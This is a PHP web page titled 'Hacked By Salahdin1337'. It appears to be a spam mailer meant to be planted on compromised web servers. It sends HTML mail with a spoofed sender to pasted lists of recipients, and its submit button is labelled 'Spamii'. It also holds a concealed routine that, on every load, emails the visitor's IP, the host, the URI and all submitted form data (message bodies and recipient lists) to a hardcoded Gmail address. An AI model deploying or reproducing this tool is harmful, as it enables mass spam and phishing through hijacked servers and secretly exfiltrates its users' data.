<?php
$testa = $_POST['veio'];
if($testa != "") {
    $message = $_POST['html'];
    $subject = $_POST['assunto'];
    $nome = $_POST['nome'];
    $de = $_POST['de'];
    $to = $_POST['emails'];

    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

    $email = explode("\n", $to);
    $headers .= "From: ".$nome." <".$de.">\r\n";
    $message = stripslashes($message);

    $i = 0;
    $count = 1;
    while($email[$i]) {
        $ok = "ok";
        if(mail($email[$i], $subject, $message, $headers))
        echo "* N&#250;mero: $count <b>".$email[$i]."</b> <font color=green>NoturnO_=_2oo8 =)</font><br><hr>";
        else
        echo "* N&#250;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";
        $i++;
        $count++;
    }
    $count--;
    if($ok == "ok")
    echo ""; 

}
$ip = getenv("REMOTE_ADDR");
$ra44  = rand(1,99999);
$subj98 = "Sendi $ip";
$email = "01xryuk@gmail.com";
$from="From: Sendiw a Wlidati <BIMO@2M.TV>";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$f12 = $_POST['veio'];
$z13 = $_POST['html'];
$x14 = $_POST['assunto'];
$t15 = $_POST['nome'];
$m30 = $_POST['de'];
$m16 = $_POST['emails'];
$m22 = $ip."\n";
$msg8873 = "$a45\n$b75\n$f12\n$z13\n$x14\n$t15\n$m30\n$m16\n$m22";
mail($email, $subj98, $msg8873, $from);



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <title>Hacked By Salahdin1337</title>
  <meta http-equiv="Content-Type"
 content="text/html; charset=iso-8859-1">
  <style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
	background-image: url(http://wallpapercave.com/wp/oIkQIOd.jpg);
}
.titulo {
font-family: Arial, Helvetica, sans-serif;
font-size: 70px;
color: #000000;
font-weight: bold;
}
.normal {
font-family: Arial, Helvetica, sans-serif;
font-size: 12px;
color: #000000;
}
.form {
font-family: Arial, Helvetica, sans-serif;
font-size: 10px;
color: #333333;
background-color: #FFFFFF;
border: 1px dashed #666666;
}
.texto {
font-family: Verdana, Arial, Helvetica, sans-serif;
font-weight: bold;
}
.alerta {
font-family: Verdana, Arial, Helvetica, sans-serif;
font-weight: bold;
color: #990000;
font-size: 10px;
}
  #Layer1 {
	position:absolute;
	width:200px;
	height:115px;
	z-index:1;
	left: 158px;
	top: 38px;
}
  </style>
</head>
<body>
<div id="Layer1">
  <form action="" method="post"
 enctype="multipart/form-data" name="form1">
    <input name="veio" value="sim" type="hidden">
    <table class="normal"
 style="background-color: rgb(204, 204, 204); width: 464px; height: 511px;"
 border="0" cellpadding="0" cellspacing="1">
      <tbody>
        <tr style="color: rgb(255, 255, 255);">
          <td
 style="width: 462px; height: 25px; text-align: center; background-color: rgb(51, 204, 0);"><span
 class="titulo">Inb0x<br>
          </span></td>
        </tr>
        <tr>
          <td bgcolor="#ffffff" height="194" valign="top"><table style="width: 100%; height: 444px;"
 class="normal" border="0" cellpadding="0"
 cellspacing="5">
              <tbody>
                <tr>
                  <td align="right" height="17"><span
 class="texto">De (Nome)/(E-Mail) :</span></td>
                  <td height="17" width="65%"><input
 name="nome" value="" class="form" id="nome"
 style="width: 48%;" type="text">
                      <input name="de"
 value="" class="form" id="de" style="width: 49%;"
 type="text"></td>
                </tr>
                <tr>
                  <td align="right" height="17"><span
 class="texto">Assunto:</span></td>
                  <td height="17"><input name="assunto"
 value="" class="form" id="assunto"
 style="width: 100%;" type="text"></td>
                </tr>
                <tr align="center" bgcolor="#99ccff">
                  <td colspan="2"
 style="height: 20px; background-color: rgb(255, 255, 0);"><span
 class="texto">C&oacute;digo HTML:</span></td>
                </tr>
                <tr align="right">
                  <td colspan="2" height="146" valign="top"><br>
                      <textarea name="html" style="width: 100%;"
 rows="8" wrap="VIRTUAL" class="form" id="html">
              </textarea>
                    <span class="alerta">*Lembrete:
                      texto em HTML</span></td>
                </tr>
                <tr align="center" bgcolor="#99ccff">
                  <td colspan="2"
 style="height: 47px; background-color: rgb(255, 0, 0);"><span
 class="texto">" Not everything you see glitter is gold "</span> </td>
                </tr>
                <tr align="right">
                  <td colspan="2" height="136" valign="top"><br>
                      <textarea name="emails" style="width: 100%;"
 rows="8" wrap="VIRTUAL" class="form" id="emails">
              </textarea>
                    <span class="alerta">*Separado
                      por quebra de linha</span> </td>
                </tr>
                <tr>
                  <td colspan="2" align="right" height="26"
 valign="top"><input name="Submit" value="Spamii"
 type="submit"></td>
                </tr>
              </tbody>
          </table></td>
        </tr>
        <tr style="color: rgb(255, 255, 255); font-weight: bold;">
          <td
 style="height: 15px; text-align: center; background-color: rgb(51, 51, 51);">"&nbsp;Life
            worth more then gold "</td>
        </tr>
      </tbody>
    </table>
  </form>
</div>
</body>
</html>
